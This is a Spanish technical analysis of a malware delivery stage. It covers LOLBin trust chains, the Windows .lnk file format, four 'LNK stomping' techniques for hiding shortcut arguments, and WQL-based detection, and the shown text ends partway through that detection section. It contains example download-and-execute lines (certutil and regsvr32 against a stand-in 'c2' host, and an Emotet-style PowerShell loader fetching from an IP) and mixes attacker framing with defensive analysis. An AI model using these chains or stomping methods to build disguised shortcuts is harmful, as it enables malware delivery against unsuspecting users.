# Etapa 3 — El Disparador: LOLBins, LNK Stomping y el Motor WQL

## Documentación Técnica de Nivel APT/Intelligence-Grade

### Análisis Formal de la Redirección de Confianza, Manipulación de Estructuras Shell, y el Sistema de Detección Basado en Eventos

---

## Índice

1. [Resumen Ejecutivo Clasificado](#1-resumen-ejecutivo)
2. [Marco Formal: LOLBins como Vector de Redirección de Confianza](#2-marco-formal-lolbins)
3. [Anatomía del Formato Shell Link Binary [MS-SHLLINK]](#3-anatomia-lnk)
4. [LNK Stomping: Taxonomía, Mecanismos y Formalización](#4-lnk-stomping)
5. [Cadenas de Ejecución Documentadas en Operaciones APT](#5-cadenas-ejecucion)
6. [El Motor WQL como Sistema de Detección: Autómata Híbrido y Pipeline de Eventos](#6-motor-wql)
7. [Análisis de la Ventana de Oportunidad: Latencia como Vector Temporal](#7-ventana-oportunidad)
8. [AMSI como Contramedida y sus Limitaciones Formales](#8-amsi)
9. [Superficie de Detección: Predicados de Alerta y Señales Compuestas](#9-superficie-deteccion)
10. [Historial de Explotación APT y Contexto Operacional](#10-historial-apts)
11. [Contramedidas por Capa y Análisis de Efectividad](#11-contramedidas)
12. [Mutaciones y Evolución Post-Detección](#12-mutaciones)
13. [Referencias y Marco Normativo](#13-referencias)

---

## 1. Resumen Ejecutivo

La Etapa 3 del vector constituye el **punto de transición entre la ingeniería social (Etapas 1-2) y la ejecución técnica (Etapas 4-5)**. Su función es transformar la interacción inocente del usuario con un archivo aparentemente legítimo en la ejecución de código arbitrario, utilizando exclusivamente binarios firmados y confiables del propio sistema operativo — los denominados Living-off-the-Land Binaries (LOLBins).

El mecanismo opera en tres dimensiones simultáneas:

**Dimensión estructural:** El archivo Shell Link (.lnk) es manipulado mediante técnicas de "stomping" para que sus campos de presentación (lo que el usuario y los motores de análisis ven) difieran de sus campos de ejecución (lo que el sistema operativo realmente ejecuta). Esto crea una **discrepancia entre la semántica declarativa y la semántica operativa** del archivo.

**Dimensión de confianza:** La cadena de ejecución atraviesa exclusivamente binarios firmados por Microsoft (`cmd.exe`, `powershell.exe`, `rundll32.exe`), cada uno de los cuales posee una firma digital válida en la Trusted Publisher Store. Los mecanismos de seguridad basados en allow-listing de firmas permiten cada transición individual, pero la **composición de la cadena completa** es anómala.

**Dimensión temporal:** El motor de eventos WQL, que constituye el principal mecanismo de detección basado en comportamiento para esta etapa, introduce una **latencia de entrega** entre la generación del evento (creación del proceso anómalo) y su consumo por el EDR. Esta ventana temporal — del orden de microsegundos a milisegundos — es suficiente para que las operaciones críticas de la Etapa 4 se completen antes de que cualquier alerta se procese.

---

## 2. Marco Formal: LOLBins como Vector de Redirección de Confianza

### 2.1 Definición Formal de LOLBin

**Definición 2.1.1 — Espacio de Binarios del Sistema**

Sea $\mathcal{B}$ el conjunto de todos los binarios ejecutables presentes en una instalación de Windows 11, y sea $\mathcal{T}: \mathcal{B} \rightarrow \{\text{Trusted}, \text{Untrusted}\}$ la función de confianza basada en firma digital:

$$\mathcal{T}(b) = \begin{cases} \text{Trusted} & \text{si } \text{Signature}(b) \in \text{TrustedPublisherStore} \wedge \text{Revoked}(b) = \text{FALSE} \\ \text{Untrusted} & \text{en otro caso} \end{cases}$$

**Definición 2.1.2 — Capacidad de Ejecución Arbitraria**

Definimos la función de capacidad $\text{Cap}: \mathcal{B} \rightarrow \mathcal{P}(\mathcal{C})$ donde $\mathcal{C}$ es el conjunto de capacidades computacionales:

$$\mathcal{C} = \{\text{ShellExec}, \text{ScriptExec}, \text{DLLLoad}, \text{FileDownload}, \text{FileWrite}, \text{RegMod}, \text{NetConnect}, \text{WMIAccess}, \text{CertMgmt}, \ldots\}$$

**Definición 2.1.3 — LOLBin**

Un Living-off-the-Land Binary es un binario $b \in \mathcal{B}$ tal que:

$$\text{LOLBin}(b) \iff \mathcal{T}(b) = \text{Trusted} \wedge \exists\, c \in \{\text{ShellExec}, \text{ScriptExec}, \text{DLLLoad}, \text{FileDownload}\} : c \in \text{Cap}(b)$$

Es decir, un LOLBin es un binario **firmado y confiable** que posee al menos una **capacidad de ejecución arbitraria** que puede ser redirigida para ejecutar código no intencionado.

### 2.2 Taxonomía del LOLBin Arsenal de Windows 11

El conjunto de LOLBins relevantes para esta etapa se clasifica por capacidad:

**Definición 2.2.1 — Conjunto LOLBin Primario**

$$\mathcal{B}_{LOL}^{prim} = \{b \in \mathcal{B} \mid \text{LOLBin}(b) \wedge \text{ShellExec} \in \text{Cap}(b) \wedge \text{ScriptExec} \in \text{Cap}(b)\}$$

| Binario | Ruta | Firma | Capacidad primaria | Syscall surface |
|---|---|---|---|---|
| `cmd.exe` | `%SystemRoot%\System32\cmd.exe` | Microsoft Windows | Shell execution, piping, scripting | Mínima: procesamiento de comandos |
| `powershell.exe` | `%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe` | Microsoft Corporation | Script execution, .NET access, COM, WMI | Extensa: acceso completo al framework .NET |
| `pwsh.exe` | `%ProgramFiles%\PowerShell\7\pwsh.exe` | Microsoft Corporation | PowerShell 7.x, cross-platform scripting | Extensa: similar a powershell.exe |
| `rundll32.exe` | `%SystemRoot%\System32\rundll32.exe` | Microsoft Windows | DLL loading and function invocation | Media: carga de DLL arbitraria |
| `mshta.exe` | `%SystemRoot%\System32\mshta.exe` | Microsoft Windows | HTML Application execution | Media: scripting via VBScript/JScript |
| `certutil.exe` | `%SystemRoot%\System32\certutil.exe` | Microsoft Windows | Certificate management, file download/decode | Media: descarga HTTP, codificación |
| `bitsadmin.exe` | `%SystemRoot%\System32\bitsadmin.exe` | Microsoft Windows | Background Intelligent Transfer | Media: descarga de archivos |
| `wmic.exe` | `%SystemRoot%\System32\wbem\wmic.exe` | Microsoft Windows | WMI command-line interface | Extensa: acceso WMI completo |
| `msiexec.exe` | `%SystemRoot%\System32\msiexec.exe` | Microsoft Windows | Windows Installer execution | Media: instalación de paquetes |

**Definición 2.2.2 — Conjunto LOLBin Secundario**

$$\mathcal{B}_{LOL}^{sec} = \{b \in \mathcal{B} \mid \text{LOLBin}(b) \wedge \text{FileDownload} \in \text{Cap}(b) \vee \text{DLLLoad} \in \text{Cap}(b)\}$$

| Binario | Capacidad | Uso en cadena |
|---|---|---|
| `regsvr32.exe` | Carga y registro de DLL/COM | Carga de SCT scripts via `/s /n /u /i:` |
| `rundll32.exe` | Carga de DLL y ejecución de export | Carga de DLL maliciosa oculta |
| `msbuild.exe` | Compilación de proyectos .NET | Ejecución de código inline en XML |
| `installutil.exe` | Instalación de componentes .NET | Ejecución de código en clases atributadas |
| `regsvcs.exe` | Registro de servicios .NET | Similar a installutil |
| `cmstp.exe` | Connection Manager Profile | Ejecución via INF malicioso |
| `forfiles.exe` | Procesamiento de directorios | Ejecución de comandos via `/c` |
| `pcalua.exe` | Program Compatibility Assistant | Ejecución de cualquier programa |
| `explorer.exe` | Shell de Windows | Navegación y ejecución indirecta |
| `control.exe` | Panel de Control | Carga de CPL maliciosos |
| `bash.exe` / `wsl.exe` | Windows Subsystem for Linux | Ejecución en entorno WSL |

### 2.3 Modelo de Redirección de Confianza como Grafo

**Definición 2.3.1 — Grafo de Ejecución de Confianza**

Definimos el grafo dirigido $G = (V, E)$ donde:
- $V = \mathcal{B} \cup \{\text{payload}\}$ (binarios del sistema + payload final)
- $E = \{(b_i, b_j) \mid b_i \text{ ejecuta o invoca a } b_j\}$

Una **cadena de confianza** es un camino $p = (b_1, b_2, \ldots, b_n, \text{payload})$ donde:

$$\forall\, i \in [1, n]: \mathcal{T}(b_i) = \text{Trusted}$$

y solo el nodo final (payload) tiene $\mathcal{T}(\text{payload}) = \text{Untrusted}$.

**Formalización de la paradoja de seguridad:**

Cada arista individual $(b_i, b_{i+1})$ en el camino es **legítima** según el criterio de allow-listing de firmas. El problema es que la **composición del camino completo** no es legítima, pero ningún mecanismo de evaluación individual de aristas puede detectar esto.

**Definición 2.3.2 — Invariante de Cadena de Confianza**

$$\text{Inv}_{chain}: \forall\, (b_i, b_{i+1}) \in E : \mathcal{T}(b_i) = \text{Trusted} \Rightarrow \text{Intent}(b_i \rightarrow b_{i+1}) \in \text{ExpectedIntents}(b_i)$$

La violación ocurre cuando:

$$\exists\, (b_i, b_{i+1}) \in E : \mathcal{T}(b_i) = \text{Trusted} \wedge \text{Intent}(b_i \rightarrow b_{i+1}) \notin \text{ExpectedIntents}(b_i)$$

Es decir, un binario confiable ejecuta una acción que no está entre las esperadas para ese binario en el contexto dado.

### 2.4 Cadenas de Ejecución Típicas

**Cadena 1 — PowerShell estándar (la más observada):**

```
Explorer.exe ──lnk──→ cmd.exe /c ──→ powershell.exe -ep bypass -w hidden -c "IEX(...)"
     │                    │                     │
  T=Trusted           T=Trusted             T=Trusted
     │                    │                     │
  Ejecuta LNK       Shell execution       Script execution
                                            .NET invocation
                                            Descarga + ejecución
```

**Cadena 2 — rundll32 con DLL:**

```
Explorer.exe ──lnk──→ rundll32.exe ──→ stage1.dll,#1
     │                    │                │
  T=Trusted           T=Trusted        T=Untrusted (DLL oculta en ISO)
     │                    │
  Ejecuta LNK       Carga de DLL
```

**Cadena 3 — mshta con HTA:**

```
Explorer.exe ──lnk──→ mshta.exe ──→ "javascript:a=GetObject(...)"
     │                    │
  T=Trusted           T=Trusted
     │                    │
  Ejecuta LNK       HTML Application
                    Script execution
                    COM object creation
```

**Cadena 4 — certutil + PowerShell (dos etapas):**

```
Explorer.exe ──lnk──→ cmd.exe /c ──→ certutil -urlcache -split -f http://c2/payload.ps1 %temp%\p.ps1
                                          │
                                       T=Trusted
                                       File download via HTTP
                                               │
                                               ▼
                                    powershell.exe -ep bypass -f %temp%\p.ps1
                                          │
                                       T=Trusted
                                       Script execution
```

**Cadena 5 — regsvr32 con SCT:**

```
Explorer.exe ──lnk──→ regsvr32 /s /n /u /i:http://c2/payload.sct scrobj.dll
     │                    │
  T=Trusted           T=Trusted
                          │
                       Scriptlet execution
                       COM scriptlet via URLMON
```

### 2.5 Propiedad de Indistinguibilidad de Transiciones Individuales

**Teorema 2.5.1 — Indistinguibilidad Local**

*Para cada transición individual $(b_i, b_{i+1})$ en una cadena de confianza, la operación es indistinguible de una operación legítima para cualquier mecanismo de evaluación basado en firma:*

$$\forall\, (b_i, b_{i+1}) \in E_{chain}: \text{SignatureCheck}(b_i \rightarrow b_{i+1}) = \text{Allow}$$

*porque tanto $b_i$ como $b_{i+1}$ están firmados por Microsoft.*

**Consecuencia:** La detección no puede basarse en la evaluación individual de aristas. Debe basarse en el **análisis del camino completo** o en **propiedades emergentes de la cadena** (anomalía de argumentos, frecuencia de invocación, contexto temporal).

---

## 3. Anatomía del Formato Shell Link Binary [MS-SHLLINK]

### 3.1 Especificación Formal del Formato

El formato Shell Link Binary está documentado en la especificación de interoperabilidad de Microsoft [MS-SHLLINK]. Un archivo `.lnk` es una estructura serializada binaria que describe un acceso directo de Windows.

**Definición 3.1.1 — Estructura del Shell Link**

Un archivo Shell Link $L$ se modela como una tupla:

$$L = (H, \text{IDList}, \text{LinkInfo}, \text{StringData}, \text{ExtraData})$$

donde cada componente es a su vez una estructura compuesta.

### 3.2 ShellLinkHeader (76 bytes obligatorios)

El header define las propiedades globales del acceso directo:

```
Offset  Size  Field                Tipo        Descripción
------  ----  -----                ----        -----------
0x00    4     HeaderSize           DWORD       Siempre 0x0000004C (76)
0x04    16    LinkCLSID            CLSID       Siempre {00021401-0000-0000-C000-000000000046}
0x14    4     LinkFlags            DWORD       Bitmask de flags (ver §3.3)
0x18    4     FileAttributes       DWORD       Atributos del archivo destino
0x1C    8     CreationTime         FILETIME    Timestamp de creación
0x24    8     AccessTime           FILETIME    Timestamp de último acceso
0x2C    8     WriteTime            FILETIME    Timestamp de última escritura
0x34    4     FileSize             DWORD       Tamaño del archivo destino (32-bit)
0x38    4     IconIndex            DWORD       Índice del icono en el archivo de iconos
0x3C    4     ShowCommand          DWORD       SW_SHOWNORMAL(1), SW_SHOWMAXIMIZED(3), SW_SHOWMINNOACTIVE(7)
0x40    2     HotKey               WORD        Tecla de acceso rápido
0x42    2     Reserved             WORD        Reservado (debe ser 0)
0x44    4     Reserved2            DWORD       Reservado (debe ser 0)
0x48    4     Reserved3            DWORD       Reservado (debe ser 0)
```

### 3.3 LinkFlags: Los Bits de Control

El campo `LinkFlags` en offset 0x14 es una máscara de bits que determina qué estructuras opcionales están presentes y cómo se interpretan:

```
Bit  Flag Name                   Valor         Relevancia para el ataque
---  ---------                   -----         -----------------------
0    HasLinkTargetIDList         0x00000001    CRÍTICO: define el destino
1    HasLinkInfo                 0x00000002    Información de ubicación del destino
2    HasName                     0x00000004    CRÍTICO: nombre mostrado al usuario
3    HasRelativePath             0x00000008    Ruta relativa
4    HasWorkingDir               0x00000010    Directorio de trabajo
5    HasArguments                0x00000020    CRÍTICO: argumentos de línea de comandos
6    HasIconLocation             0x00000040    CRÍTICO: ubicación del icono
7    IsUnicode                   0x00000080    Codificación de strings
8    ForceNoLinkInfo             0x00000100    Sin información de enlace
9    HasExpString                0x00000200    Environment variable expansion
10   RunInSeparateProcess        0x00000400    Ejecución en proceso separado
11   Unused1                     0x00000800    No utilizado
12   HasDarwinID                 0x00001000    Identificador de installer
13   RunAsUser                   0x00002000    Ejecución como otro usuario
14   HasExpIcon                  0x00004000    Icono con variables de entorno
15   NoPidlAlias                 0x00008000    Sin alias de PIDL
16   Unused2                     0x00010000    No utilizado
17   RunWithShimLayer             0x00020000    Ejecución con shim layer
18   ForceNoLinkTrack            0x00040000    Sin tracking de enlace
19   EnableTargetMetadata        0x00080000    Metadata del destino habilitada
20   DisableLinkPathTracking     0x00100000    Sin tracking de ruta
21   DisableKnownFolderTracking  0x00200000    Sin tracking de carpetas conocidas
22   DisableKnownFolderAlias     0x00400000    Sin alias de carpetas conocidas
23   AllowLinkToLink             0x00800000    Permitir enlace a enlace
24   UnaliasOnSave               0x01000000    Desaliasar al guardar
25   PreferEnvironmentPath       0x02000000    Preferir variable de entorno
26   KeepLocalIDListForUNCTarget 0x04000000    Mantener IDList local para UNC
27-31 Reserved                   0xF8000000    Reservados
```

**Los bits críticos para el vector de ataque son:**

| Bit | Nombre | Uso en el vector |
|---|---|---|
| 0 | HasLinkTargetIDList | Debe estar activo: define que `cmd.exe` es el destino real |
| 2 | HasName | Controla si se muestra el nombre "Factura.pdf" |
| 5 | HasArguments | **Objetivo del LNK Stomping**: su manipulación oculta los argumentos |
| 6 | HasIconLocation | Debe estar activo: apunta al icono de Acrobat |

### 3.4 Estructuras de String Data

Las estructuras de datos de cadena almacenan los metadatos legibles del enlace:

**Definición 3.4.1 — String Data como tupla**

$$\text{StringData} = (\text{NameString}, \text{RelativePath}, \text{WorkingDir}, \text{CommandLineArguments}, \text{IconLocation})$$

Cada campo es una cadena de longitud variable precedida por un indicador de longitud:

```
Estructura NameString (ejemplo malicioso):
┌─────────────────────────────────────────┐
│ CountCharacters: 0x0C (12)              │  ← Longitud en caracteres Unicode
│ NameString: "Factura.pdf"               │  ← Nombre mostrado al usuario
└─────────────────────────────────────────┘

Estructura CommandLineArguments (ejemplo malicioso):
┌─────────────────────────────────────────┐
│ CountCharacters: 0x32 (50)              │  ← Longitud
│ String: "/c powershell -ep bypass       │
│          -w hidden -c IEX(...)"          │  ← Argumentos reales
└─────────────────────────────────────────┘

Estructura IconLocation (ejemplo malicioso):
┌─────────────────────────────────────────┐
│ CountCharacters: 0x3C (60)              │  ← Longitud
│ String: "C:\Program Files\Adobe\        │
│          Acrobat DC\Acrobat\             │
│          Acrobat.exe"                    │  ← Fuente del icono de PDF
└─────────────────────────────────────────┘
```

### 3.5 LinkTargetIDList: El Destino Real

La estructura `LinkTargetIDList` contiene la lista de identificadores de shell (PIDL - Pointer to an ID List) que identifican el objeto destino:

```
LinkTargetIDList:
┌──────────────────────────────────────────┐
│ IDListSize: WORD                          │  ← Tamaño total de la lista
│ ItemID[1]: Shell item                     │  ← Ej: "C:\"
│ ItemID[2]: Shell item                     │  ← Ej: "Windows"
│ ItemID[3]: Shell item                     │  ← Ej: "System32"
│ ItemID[4]: Shell item                     │  ← Ej: "cmd.exe"
│ TerminalID: 0x0000                        │  ← Fin de la lista
└──────────────────────────────────────────┘
```

**La divergencia fundamental** entre el vector de ataque y un enlace legítimo está aquí: el `LinkTargetIDList` apunta a `cmd.exe` (o `powershell.exe`, `rundll32.exe`), mientras que el `IconLocation` apunta a `Acrobat.exe` y el `NameString` muestra "Factura.pdf".

### 3.6 ExtraData: Extensiones del Formato

El campo `ExtraData` contiene bloques opcionales que extienden la funcionalidad del enlace:

```
ExtraData Blocks:
┌─────────────────────────────────────────┐
│ EnvironmentVariableDataBlock            │  ← Variables de entorno expandidas
│ ConsoleDataBlock                        │  ← Configuración de consola
│ TrackerDataBlock                        │  ← Distributed Link Tracking
│ ConsoleFEDataBlock                      │  ← Configuración FE de consola
│ SpecialFolderDataBlock                  │  ← Carpetas especiales
│ DarwinDataBlock                         │  ← Windows Installer
│ IconEnvironmentDataBlock                │  ← Icono con variables de entorno
│ ShimDataBlock                           │  ← Application Compatibility Shim
│ PropertyStoreDataBlock                  │  ← Propiedades extendidas
│ KnownFolderDataBlock                    │  ← Carpetas conocidas
│ VistaAndAboveIDListDataBlock            │  ← IDList para Vista+
└─────────────────────────────────────────┘
```

Los bloques `PropertyStoreDataBlock` y `ShimDataBlock` son de particular interés en variantes avanzadas del vector, ya que permiten inyectar metadatos adicionales y mecanismos de compatibilidad que pueden influir en el comportamiento de ejecución.

### 3.7 Parsing Diferencial: El Corazón del Stomping

**Definición 3.7.1 — Funciones de Parsing Discrepantes**

Existen múltiples funciones de parsing del formato LNK en Windows, cada una implementada en un componente diferente:

| Componente | Función | Propósito | Implementación |
|---|---|---|---|
| `shell32.dll` | `CShellLink::Load()` | Ejecución del enlace | Parsing completo, incluye ExtraData |
| `explorer.exe` | Vista de propiedades | Mostrar propiedades al usuario | Parsing parcial, depende de flags |
| `ntshrui.dll` | Vista previa en tooltips | Tooltip al pasar el mouse | Parsing simplificado |
| EDR/AV engines | Análisis estático | Detección de contenido malicioso | Variable según implementación |

**La discrepancia explotada:**

$$P_{shell32}(L, F) \neq P_{display}(L, F)$$

donde $P_{shell32}$ es la función de parsing del ejecutor de enlaces y $P_{display}$ es la función de parsing de la interfaz de propiedades. Específicamente, la diferencia radica en el manejo de los campos `CommandLineArguments` cuando el bit `HasArguments` no está activo pero los argumentos existen en la estructura de datos.

---

## 4. LNK Stomping: Taxonomía, Mecanismos y Formalización

### 4.1 Definición Formal de LNK Stomping

**Definición 4.1.1 — Invariante de Consistencia de Parseo**

Sea $\text{ArgsDisplayed}(L)$ el conjunto de argumentos mostrados al usuario (o al motor de análisis) al inspeccionar el archivo LNK $L$, y sea $\text{ArgsExecuted}(L)$ el conjunto de argumentos realmente pasados al proceso destino al ejecutar $L$. El invariante de consistencia de parseo es:

$$\text{Inv}_{parse}: \forall\, L : \text{ArgsDisplayed}(L) = \text{ArgsExecuted}(L)$$

**Definición 4.1.2 — LNK Stomping**

$$\text{LNK\_Stomping}(L) \iff \neg\text{Inv}_{parse}(L)$$

Es decir, un LNK ha sido "stompeado" cuando los argumentos que se muestran/analizan difieren de los argumentos que se ejecutan.

### 4.2 Taxonomía de Técnicas de Stomping

#### 4.2.1 Técnica A: Manipulación del Flag HasArguments

**Mecanismo:** Establecer el bit `HasArguments` (bit 5 de `LinkFlags`) a `0` mientras los argumentos reales se almacenan en una ubicación que el ejecutor procesa pero el display ignora.

```
Header LinkFlags:
  HasArguments = 0  (bit 5 limpiado)

Pero CommandLineArguments SÍ existe:
  StringData.CommandLineArguments = "/c powershell -ep bypass -w hidden -c ..."

Resultado:
  P_display(L)  → no muestra argumentos (flag indica que no hay)
  P_shell32(L)  → ejecuta con argumentos (procesa ExtraData/CommandLineArguments)
```

**Formalización:**

$$\text{Técnica\_A}(L) \iff \text{LinkFlags}.\text{HasArguments}(L) = 0 \wedge \text{ArgsExecuted}(L) \neq \emptyset$$

#### 4.2.2 Técnica B: Padding en ExtraData

**Mecanismo:** Insertar bloques de datos de relleno en `ExtraData` para desplazar la posición de los argumentos más allá del punto donde los parsers lineales dejan de leer.

```
ExtraData structure:
┌───────────────────────────────┐
│ EnvironmentVariableDataBlock  │  ← Legítimo
├───────────────────────────────┤
│ PropertyStoreDataBlock        │  ← Legítimo
├───────────────────────────────┤
│ PaddingBlock (unknown GUID)   │  ← Relleno: 4KB de datos nulos
│ Size: 0x1000                  │
├───────────────────────────────┤
│ CommandLineArguments          │  ← Argumentos maliciosos
│ (almacenados después del      │   fuera del rango de lectura
│  padding masivo)              │   de parsers simplistas
└───────────────────────────────┘

Resultado:
  Parser simplista → no lee más allá del padding → no ve argumentos
  Shell32 parser   → lee todo ExtraData           → ejecuta con argumentos
```

#### 4.2.3 Técnica C: Corrupción Controlada de Metadatos

**Mecanismo:** Manipular campos de metadatos (timestamps, file size en el header) para causar que algunos parsers fallen al validar la consistencia interna del archivo, abandonen el parsing prematuramente, y nunca lleguen a leer los argumentos.

```
ShellLinkHeader manipulado:
  FileSize (offset 0x34) = 0xFFFFFFFF    ← Tamaño inválido
  CreationTime = 0                        ← Timestamp nulo

Resultado:
  Parsers con validación estricta → rechazan el archivo al detectar inconsistencia
  Shell32 (tolerante)             → ignora campos inválidos, ejecuta normalmente
```

#### 4.2.4 Técnica D: Unicode/ANSI Mismatch

**Mecanismo:** Almacenar los argumentos como string ANSI (sin el flag `IsUnicode` activo) pero en un formato que los parsers Unicode interpretan incorrectamente, causando que los argumentos aparezcan como caracteres corruptos en la visualización pero se procesen correctamente en la ejecución.

```
LinkFlags:
  IsUnicode = 0 (bit 7 = 0)  → Strings en ANSI

CommandLineArguments:
  Almacenado como ANSI: "/c powershell -ep bypass -w hidden -c IEX(...)"

P_display (espera Unicode) → Lee bytes ANSI como Unicode → caracteres corruptos
P_shell32 (respeta flag)   → Lee como ANSI → argumentos correctos
```

### 4.3 Análisis Formal de la Discrepancia

**Definición 4.3.1 — Función de Parsing Generalizada**

Sea $P: \text{LNK} \times \text{Parser} \rightarrow \text{Interpretation}$ la función de parsing generalizada. La discrepancia se modela como:

$$\Delta_P(L) = P(L, \text{shell32}) \oplus P(L, \text{display})$$

donde $\oplus$ denota la diferencia simétrica entre las interpretaciones. El vector de ataque es efectivo cuando:

$$\Delta_P(L) \neq \emptyset$$

específicamente, cuando la diferencia incluye los argumentos de línea de comandos.

**Teorema 4.3.1 — Condiciones de Efectividad del Stomping**

*Un LNK stomping es efectivo si y solo si se cumplen simultáneamente:*

1. $P(L, \text{shell32}).\text{Target} \in \mathcal{B}_{LOL}$ (el destino es un LOLBin)
2. $P(L, \text{shell32}).\text{Args} \neq \emptyset$ (hay argumentos de ejecución)
3. $P(L, \text{display}).\text{Args} = \emptyset \vee P(L, \text{display}).\text{Args} \neq P(L, \text{shell32}).\text{Args}$ (los argumentos no son visibles o son diferentes)
4. $P(L, \text{shell32}).\text{Icon} \neq P(L, \text{shell32}).\text{Target}$ (el icono no corresponde al destino real)

### 4.4 Detección por Contradicción de Invariantes

**Definición 4.4.1 — Predicado de Contradicción**

$$\text{Contradiction}(L) \iff (\text{HasArguments}(L) = 0 \wedge \text{ArgsExecuted}(L) \neq \emptyset)$$

$$\vee\; (\text{HasLinkInfo}(L) = 0 \wedge \text{TargetExists}(L))$$

$$\vee\; (\text{FileSize}(L) = 0 \wedge \text{TargetSize}(L) \neq 0)$$

Cualquiera de estas contradicciones es una **señal inequívoca** de manipulación del archivo LNK.

### 4.5 CVE Asociadas y Variantes de LNK Stomping

| CVE | Año | Descripción | Gravedad |
|---|---|---|---|
| CVE-2010-2568 | 2010 | Shell Link processing vulnerability (Stuxnet) | 9.3 CRITICAL |
| CVE-2015-0096 | 2015 | LNK shortcut file code execution | 7.8 HIGH |
| CVE-2017-8464 | 2017 | LNK remote code execution (LNK of Death) | 8.8 HIGH |
| CVE-2020-0729 | 2020 | LNK processing vulnerability | 7.8 HIGH |
| Variantes no-CVE | 2021+ | LNK stomping sin CVE asignada (comportamiento de diseño) | Variable |

---

## 5. Cadenas de Ejecución Documentadas en Operaciones APT

### 5.1 Anatomía de un LNK Malicioso en Campo

A continuación se describe la estructura real observada en campañas documentadas por empresas de threat intelligence:

```
═══════════════════════════════════════════════════════════════
     ANATOMÍA DE LNK MALICIOSO: CAMPAÑA EMOTET 2022
═══════════════════════════════════════════════════════════════

SHELL LINK HEADER (76 bytes):
┌─────────────────────────────────────────────────────────────┐
│ HeaderSize       : 0x0000004C                               │
│ LinkCLSID        : {00021401-0000-0000-C000-000000000046}  │
│ LinkFlags        : 0x0000008F                               │
│   HasLinkTargetIDList : 1  ✓                                │
│   HasLinkInfo         : 1  ✓                                │
│   HasName             : 1  ✓                                │
│   HasRelativePath     : 1  ✓                                │
│   HasWorkingDir       : 0                                    │
│   HasArguments        : 1  ✓ (flag visible)                 │
│   HasIconLocation     : 1  ✓                                │
│   IsUnicode           : 1  ✓                                │
│ FileAttributes   : 0x00000020 (FILE_ATTRIBUTE_ARCHIVE)      │
│ CreationTime     : 0x01D8... (2022-03-15 14:23:01)          │
│ FileSize         : 0x00000000 (0 bytes!)                    │
│ IconIndex        : 0                                         │
│ ShowCommand      : 0x00000001 (SW_SHOWNORMAL)               │
│ HotKey           : 0x0000                                    │
└─────────────────────────────────────────────────────────────┘

LINK TARGET ID LIST:
┌─────────────────────────────────────────────────────────────┐
│ ItemID[1]: 0x1F bytes → "C:\"                               │
│ ItemID[2]: 0x19 bytes → "Windows"                           │
│ ItemID[3]: 0x23 bytes → "System32"                          │
│ ItemID[4]: 0x1E bytes → "cmd.exe"                           │
│ TerminalID: 0x0000                                           │
└─────────────────────────────────────────────────────────────┘

LINK INFO:
┌─────────────────────────────────────────────────────────────┐
│ LinkInfoFlags    : 0x00000001 (VolumeIDAndLocalBasePath)    │
│ LocalBasePath    : "C:\Windows\System32\cmd.exe"            │
└─────────────────────────────────────────────────────────────┘

STRING DATA:
┌─────────────────────────────────────────────────────────────┐
│ NameString (UNICODE):                                       │
│   CountCharacters: 36                                        │
│   "Documentos_Factura_20220315.pdf"                         │
│                                                              │
│ RelativePath (UNICODE):                                     │
│   CountCharacters: 14                                        │
│   "..\..\cmd.exe"                                           │
│                                                              │
│ CommandLineArguments (UNICODE):                              │
│   CountCharacters: 192                                       │
│   "/c powershell -w hidden -nop -ep bypass -c              │
│    \"$t=[System.IO.Path]::GetTempFileName();               │
│     Invoke-WebRequest -Uri 'http://185.XX.XX.XX/d.jpg'     │
│     -OutFile $t;                                            │
│     $b=[System.IO.File]::ReadAllBytes($t);                 │
│     [System.Reflection.Assembly]::Load($b);                │
│     [Namespace.Class]::Main()\""                            │
│                                                              │
│ IconLocation (UNICODE):                                      │
│   CountCharacters: 61                                        │
│   "C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe"  │
└─────────────────────────────────────────────────────────────┘

EXTRA DATA:
┌─────────────────────────────────────────────────────────────┐
│ EnvironmentVariableDataBlock (0x00000314 bytes)             │
│ TrackerDataBlock (0x00000060 bytes)                         │
│ PropertyStoreDataBlock (0x00000052 bytes)                   │
└─────────────────────────────────────────────────────────────┘
═══════════════════════════════════════════════════════════════
```

### 5.2 Análisis de la Discrepancia Semiótica

Siguiendo el modelo semiótico de Peirce formalizado en la Etapa 2:

| Componente Semiótico | Valor en el LNK malicioso |
|---|---|
| **Representamen (R)** | Icono de Acrobat + "Documentos_Factura_20220315.pdf" |
| **Objeto (O)** | cmd.exe → powershell.exe → descarga y ejecución de .NET assembly |
| **Interpretante (I)** | "Documento PDF legítimo de facturación" |
| **Condición de engaño** | $R \neq O \wedge I(R) = I(O)$ → $\text{Deceit}(S) = \text{TRUE}$ |

### 5.3 Variantes Observadas por Grupo APT

| Grupo | LNK Target | Icono usado | Payload args (primeros 20 chars) |
|---|---|---|---|
| Emotet (TA542) | `cmd.exe` | Acrobat, Word, Excel | `/c powershell -w hidden -nop` |
| IcedID (TA580) | `cmd.exe` | Acrobat, Windows folders | `/c rundll32 %temp%\x.dll,` |
| BazarLoader (TA551) | `cmd.exe` | Acrobat, Chrome | `/c powershell -ep bypass -c` |
| FIN7 | `cmd.exe` | Acrobat, Excel, Explorer | `/c mshta javascript:a=...` |
| QakBot (TA570) | `cmd.exe` | Acrobat, Word | `/c msiexec /q /i %temp%\x.msi` |
| Magniber | `powershell.exe` | Acrobat | `-ep bypass -w hidden -c IEX` |
| Quantum Locker | `cmd.exe` | PDF genérico | `/c powershell -nop -w hidden` |

---

## 6. El Motor WQL como Sistema de Detección: Autómata Híbrido y Pipeline de Eventos

### 6.1 WQL como Cálculo de Predicados de Primer Orden

**Definición 6.1.1 — Sintaxis de WQL de Eventos**

Una consulta WQL de eventos se expresa formalmente como:

$$\omega = \text{SELECT } \pi \text{ FROM } \epsilon \text{ WHERE } \psi$$

donde:
- $\pi \subseteq P_c$ es la proyección (subconjunto de propiedades de la clase de evento)
- $\epsilon$ es la clase de evento (subclase de `__ExtrinsicEvent` o `__InstanceOperationEvent`)
- $\psi$ es un predicado sobre las propiedades de $\epsilon$

**Definición 6.1.2 — Semántica Formal**

La evaluación de una consulta WQL sobre el universo de instancias $\mathcal{U}$ en un instante $t$ se define como:

$$\llbracket \omega \rrbracket_t = \{ \pi(e) \mid e \in \mathcal{I}_{\epsilon}(t) \wedge \psi(e) \}$$

**Teorema 6.1.1 — WQL es un Fragmento Decidible**

WQL carece de cuantificadores universales ($\forall$), subconsultas anidadas y `JOIN`. Por lo tanto, toda consulta WQL se reduce a un **fragmento existencial-conjuntivo** del cálculo de predicados de primer orden, que es decidible. El problema de evaluación pertenece a PSPACE en general, pero para consultas bien formadas sin expresiones regulares complejas, la complejidad es típicamente polinomial.

